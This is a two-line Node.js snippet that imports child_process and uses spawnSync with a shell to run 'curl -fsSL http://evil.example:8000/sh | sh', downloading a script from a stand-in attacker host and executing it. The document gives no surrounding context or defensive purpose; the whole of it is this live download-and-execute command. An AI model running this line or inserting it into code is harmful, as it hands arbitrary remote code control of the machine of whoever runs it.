import child_process from "node:child_process"

child_process.spawnSync('curl -fsSL http://evil.example:8000/sh | sh', {shell: true})
